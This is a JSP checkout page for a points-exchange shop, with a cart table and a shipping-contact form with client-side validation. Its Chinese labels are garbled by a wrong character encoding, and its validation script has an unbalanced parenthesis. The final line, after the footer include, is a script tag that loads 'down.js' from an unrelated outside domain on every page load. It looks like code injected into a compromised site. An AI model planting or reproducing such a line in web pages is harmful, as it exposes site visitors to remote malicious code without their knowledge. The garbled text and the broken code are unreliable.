<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="��������-�һ�"/> 
<%@ include file="IncludeTop.jsp" %>
<script type="text/javascript">
function checkAll(){
	if(
	   validate(document.createExchangeForm.name, '����', 'chinese', 0, 64, false) &&
       validate(document.createExchangeForm.address, '��ַ', 'public', 0, 255, false)&&	   
	   validate(document.createExchangeForm.zip, '�ʱ�', 'number', 6, 6, false)&&
	   validate(document.createExchangeForm.telNo, '��ϵ�绰', 'public', 0, 20, true)&&
	   validate(document.createExchangeForm.mobile, '�ֻ�', 'number', 0, 20, true)&&
   	   validate(document.createExchangeForm.email, 'Email', 'email', 0, 64, false)){
	         if(isBothNull(document.createExchangeForm.telNo.value, document.createExchangeForm.mobile.value){
			    alert('��ϵ�绰���ֻ�����ͬʱΪ��');
			    return false;
			}
	   	    return true;
	   }
   return false;
}
</script>
<style type="text/css">
<!--
.STYLE1 {color: #FF0000}
-->
</style>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" height="129" valign="top">
		<%@ include file="accountBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	</td>
    <td bgcolor="#FFFFFF" valign="top" width="602"> 
	  <form name="createExchangeForm" method="post" action='<c:url value="/createExchange.do"/>' submit="">
        <table width="100%" border="0" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
          <tr bgcolor="#ACD1FF"> 
            <td height="28" colspan="2" align="center"><strong>���Ķһ��嵥</strong></td>
            <td align="center"><a href='<c:url value="/queryProduct.do"/>'>�����һ�</a></td>
          </tr>
          <tr bgcolor="#E1EFFF"> 
            <td width="35%" height="28" align="center"> 
            ��Ʒ����</td>
            <td width="15%" align="center"> 
            ������</td>
            <td width="15%" align="center"> 
            ����</td>
          </tr>
          <c:set var="cart" value="${sessionScope.cart}"/>
		  <c:if test="${cart eq null or cart.items eq null or cart.itemSize eq 0}"> 
          <tr> 
            <td height="79" colspan="3" align="center" class="red15"> 
              ��Ϊ�գ�</td>
          </tr>
          </c:if>
		  <c:if test="${cart ne null}">
		  <c:forEach var="item" items="${cart.items}" > 
          <tr> 
            <td width="35%" height="29" align="center"><c:out value="${item.product.name}"/></td>
            <td width="15%" align="center"><c:out value="${item.realPoint}"/></td>
            <td width="15%" align="center"><c:out value="${item.quantity}"/></td>
          </tr>
          </c:forEach>
		  </c:if> 
          <tr bgcolor="#E1EFFF"> 
            <td width="35%" height="35" align="center"><strong>�ϼ�</strong></td>
            <td width="15%" align="center"><c:out value="${cart.total}"/></td>
            <td width="15%" align="center"><c:out value="${cart.count}"/></td>
          </tr>
        </table>
		<c:set var="customer" value="${sessionScope.userSession.customer}"/>
		<table width="100%" border="0">
          <tr>
            <td height="28" colspan="2">&nbsp;</td>
          </tr>
          <tr bgcolor="#ACD1FF"> 
            <td height="28" colspan="2" align="center"> 
            <p><strong> �ջ�����ϵ��ʽ��</strong></p>            </td>
          </tr>
          <tr> 
            <td width="16%" height="28" align="right"><span class="STYLE1">*</span>������</td>
            <td width="73%"> 
              <input type="text" name="name" value='<c:out value="${customer.name}"/>' maxlength="64" size="20" >            </td>
          </tr>
          <tr> 
            <td width="16%" height="28" align="right"> <span class="STYLE1">*</span>��ַ��</td>
            <td width="73%"> 
              <input type="text" name="address" value='<c:out value="${customer.address}"/>'  maxlength="255" size="60">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>�ʱࣺ</td>
            <td width="73%"> 
              <input type="text" name="zip"  value='<c:out value="${customer.zip}"/>'  size="20" maxlength="6">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>��ϵ�绰��</td>
            <td width="73%"> 
              <input type="text" name="telNo" value='<c:out value="${customer.telNo}"/>' size="20" maxlength="20">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>�ֻ���</td>
            <td width="73%"> 
              <input type="text" name="mobile" value='<c:out value="${customer.mobile}"/>' size="20" maxlength="20">            </td>
          </tr>
          <tr> 
            <td width="16%" align="right" height="28"><span class="STYLE1">*</span>Email��</td>
            <td width="73%"> 
              <input type="text" name="email" value='<c:out value="${customer.email}"/>'  size="40" maxlength="64">            </td>
          </tr>
          
          <tr> 
            <td width="16%">&nbsp;</td>
            <td width="73%">&nbsp;</td>
          </tr>
          <tr  bgcolor="#E1EFFF"> 
            <td colspan="2" align="center" height="31"> 
              <input type="submit" name="Submit" value="�ύ">              <input type="reset" name="Submit2" value="����">              </td>
          </tr>
        </table>
  </form>    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>